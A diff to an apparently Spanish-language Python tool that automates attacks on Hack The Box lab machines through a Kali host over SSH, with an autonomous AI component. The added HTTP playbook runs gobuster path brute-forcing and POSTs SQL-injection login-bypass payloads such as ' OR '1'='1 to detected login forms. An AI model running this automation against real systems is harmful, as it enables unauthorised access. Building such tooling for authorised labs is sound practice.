@@ -8,6 +8,7 @@ SOLO para rangos de laboratorio autorizados (HTB). Uso educativo en máquinas pr
 import asyncio
 import ipaddress
 import re
+import socket
 import time
 
 import paramiko
@@ -62,8 +63,18 @@ def _ssh():
 
 
 def _run(client, cmd, timeout=120) -> str:
-    _, o, e = client.exec_command(cmd, timeout=timeout)
-    return (o.read() + e.read()).decode(errors="replace")
+    """Ejecuta en la Kali por SSH. NUNCA propaga: si el comando se cuelga más del
+    timeout, paramiko lanza socket.timeout (== TimeoutError, str() vacío en 3.10+)
+    al leer el canal. Lo convertimos en un MARCADOR de texto para que ni los
+    playbooks ni el cerebro IA se mueran por un comando lento (gobuster, curl que
+    cuelga, etc.). El que llama reacciona al marcador, no a una excepción ciega."""
+    try:
+        _, o, e = client.exec_command(cmd, timeout=timeout)
+        return (o.read() + e.read()).decode(errors="replace")
+    except (socket.timeout, TimeoutError):
+        return f"[TIMEOUT: el comando excedió {timeout}s sin terminar]"
+    except Exception as ex:
+        return f"[ERROR exec: {type(ex).__name__}: {ex}]"
 
 
 def _sudo_pw() -> str:
@@ -263,6 +274,95 @@ def pb_mysql(client, target, steps) -> list:
     return flags
 
 
+# Wordlist de Kali siempre presente (paquete dirb). Para fuzzing de rutas web.
+WEB_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
+# Payloads clásicos de bypass de autenticación por SQLi (vector típico de cajas web
+# tipo Appointment). Login con ' OR '1'='1 -> entra sin credenciales válidas.
+_SQLI_BYPASS = ["admin' or '1'='1' -- -", "admin' or 1=1 -- -", "' or ''='", "admin'#"]
+
+
+def _http_scan(client, target, steps, scheme) -> list:
+    """Estilo Appointment: web (80/443) -> fingerprint + gobuster + caza de flags +
+    intento de SQLi auth bypass. Lo que no caiga aquí queda servido para el cerebro."""
+    base = f"{scheme}://{target}"
+    ck = "-k " if scheme == "https" else ""    # https: saltar verificación TLS del lab
+
+    # 1) Fingerprint + portada + robots.txt en una sola pasada.
+    info = _run(client,
+        f"whatweb -a1 {base} 2>/dev/null; echo '---INDEX---'; "
+        f"curl -s {ck}-m 15 -iL {base}/; echo '---ROBOTS---'; "
+        f"curl -s {ck}-m 10 {base}/robots.txt", timeout=70)
+    flags = list(dict.fromkeys(FLAG_RE.findall(info)))
+    has_login = bool(re.search(r'type=["\']?password|name=["\']?password', info, re.I))
+    _step(steps, "ENUM", f"HTTP fingerprint {base}",
+          "flag!" if flags else ("login detectado" if has_login else "página leída"),
+          info, [f"flag={flags[0]}"] if flags
+          else (["formulario de login en /"] if has_login else []))
+    if flags:
+        return flags
+
+    # 2) Descubrimiento de rutas con gobuster (silencioso, acotado).
+    paths_out = _run(client,
+        f"gobuster dir -u {base} -w {WEB_WORDLIST} -t 30 -q --no-error -k 2>/dev/null "
+        f"| head -80", timeout=200)
+    # gobuster -q saca la ruta SIN barra inicial ni URL ("css", "index.php"); la
+    # normalizamos a "/css". Saltamos el ruido .ht* que siempre da 403.
+    paths = re.findall(r"(?m)^\s*(/?\S+)\s+\(Status:\s*(\d+)\)", paths_out)
+    interesting = list(dict.fromkeys(
+        "/" + p.lstrip("/") for p, s in paths
+        if s in ("200", "301", "302", "401", "403")
+        and not p.lstrip("/").startswith(".ht")))
+    _step(steps, "ENUM", f"gobuster rutas {base}",
+          "rutas encontradas" if interesting else "sin rutas (marcador/timeout)",
+          paths_out, [f"rutas={interesting[:25]}"] if interesting else [])
+
+    # 3) Curl de rutas interesantes -> caza flags y detecta más logins.
+    for p in interesting[:15]:
+        body = _run(client, f"curl -s {ck}-m 12 -L {base}{p}", timeout=25)
+        found = FLAG_RE.findall(body)
+        if found:
+            flags += found
+            _step(steps, "LOOT", f"GET {p}", "flag!", body, [f"flag={found[0]}"])
+        if not has_login and re.search(r'type=["\']?password|<form', body, re.I):
+            has_login = True
+
+    # 4) SQLi auth bypass en / y rutas con pinta de login.
+    if has_login:
+        login_paths = list(dict.fromkeys(
+            ["/"] + [p for p in interesting
+                     if re.search(r"log|admin|sign|auth|user", p, re.I)]))[:6]
+        last = ""
+        for lp in login_paths:
+            for pay in _SQLI_BYPASS:
+                # Comillas DOBLES: los payloads contienen ' (comilla simple); con
+                # comillas simples el shell de la Kali rompería el quoting y el dato
+                # llegaría destrozado. Ninguno de los payloads contiene " ni $ ni `.
+                resp = _run(client,
+                    f"curl -s {ck}-m 12 -L -X POST "
+                    f'--data-urlencode "username={pay}" '
+                    f'--data-urlencode "password={pay}" {base}{lp}', timeout=25)
+                last = resp
+                found = FLAG_RE.findall(resp)
+                if found:
+                    flags += found
+                    _step(steps, "EXPLOIT", f"SQLi auth bypass POST {lp}",
+                          "flag!", resp, [f"payload={pay}", f"flag={found[0]}"])
+                    return list(dict.fromkeys(flags))
+        _step(steps, "EXPLOIT", "SQLi auth bypass (login)",
+              "probado sin flag directa — sigue el cerebro IA", last,
+              ["formularios de login probados con OR 1=1; revisar respuesta/redirecciones"])
+
+    return list(dict.fromkeys(flags))
+
+
+def pb_http(client, target, steps) -> list:
+    return _http_scan(client, target, steps, "http")
+
+
+def pb_https(client, target, steps) -> list:
+    return _http_scan(client, target, steps, "https")
+
+
 # servicio detectado por nmap -> playbook a ejecutar
 PLAYBOOKS = {
     "telnet": pb_telnet,
@@ -272,6 +372,11 @@ PLAYBOOKS = {
     "redis": pb_redis,        # 6379 (Redeemer)
     "rsync": pb_rsync,        # 873  (Synced)
     "mysql": pb_mysql,        # 3306 (Sequel)
+    "http": pb_http,          # 80   (Appointment y cajas web)
+    "http-proxy": pb_http,    # 8080
+    "http-alt": pb_http,      # 8000/8888
+    "https": pb_https,        # 443
+    "ssl/http": pb_https,     # 443 (nmap a veces lo etiqueta así)
 }
 
 
@@ -328,6 +433,12 @@ def _hunt(target: str) -> dict:
         _step(steps, "RECON", "nmap -sV (top-1000)" + (" → escala a -p-" if extra else ""),
               f"{len(ports)} puerto(s) abierto(s)", nm + extra, [f"{p}/{s}" for p, s in ports])
 
+        if not ports:
+            _step(steps, "RECON", "host responde pero 0 puertos TCP",
+                  "IP probablemente caducada o máquina recién arrancada",
+                  "Las IPs de HTB cambian en cada spawn. Re-spawnea la máquina en HTB y "
+                  "pega la IP NUEVA; o si acabas de arrancarla espera 1-2 min y reintenta.")
+
         ran = set()
         sin_playbook = []
         for p, svc in ports:
@@ -358,9 +469,10 @@ def _hunt(target: str) -> dict:
                 res["flags"] += brain_flags
                 res["flags"] = list(dict.fromkeys(res["flags"]))
             except Exception as ex:
-                _step(steps, "IA", "cerebro autónomo", f"omitido: {ex}")
+                _step(steps, "IA", "cerebro autónomo",
+                      f"omitido: {type(ex).__name__}: {ex}".rstrip(": "))
 
-        res["status"] = "owned" if res["flags"] else "recon-only"
+        res["status"] = "owned" if res["flags"] else ("recon-only" if ports else "sin-puertos")
     finally:
         client.close()
 
@@ -372,7 +484,8 @@ def _hunt(target: str) -> dict:
             _step(steps, "VAULT", "guardar runbook + flags",
                   "guardado", ruta, [f"runbook={ruta}"])
     except Exception as ex:
-        _step(steps, "VAULT", "guardar runbook", f"omitido: {ex}")
+        _step(steps, "VAULT", "guardar runbook",
+              f"omitido: {type(ex).__name__}: {ex}".rstrip(": "))
 
     return res
 
